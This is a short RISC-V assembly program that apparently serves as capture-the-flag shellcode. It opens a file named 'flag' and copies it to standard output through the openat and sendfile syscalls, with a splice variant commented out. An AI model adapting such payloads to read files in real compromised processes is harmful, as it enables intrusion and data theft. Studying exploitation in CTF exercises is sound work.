#define __NR_openat 56
#define __NR_splice 76
#define __NR3264_sendfile 71
#define AT_FDCWD -100
#define O_RDONLY 0

.globl _start
.option rvc
_start:
    li a0, AT_FDCWD
    lla a1, path
    li a2, O_RDONLY
    li a7, __NR_openat
    scall
    /* a0 = fd */
    /*
    li a1, 0
    li a2, 1
    li a3, 0
    li a4, 32
    li a5, 0
    li a7, __NR_splice
    scall
    */
    mv a1, a0
    li a0, 1
    //li a2, 0
    //li a3, 32 // a3 seems to contain big enough value already
    li a7, __NR3264_sendfile
    scall
path:
    .string "flag"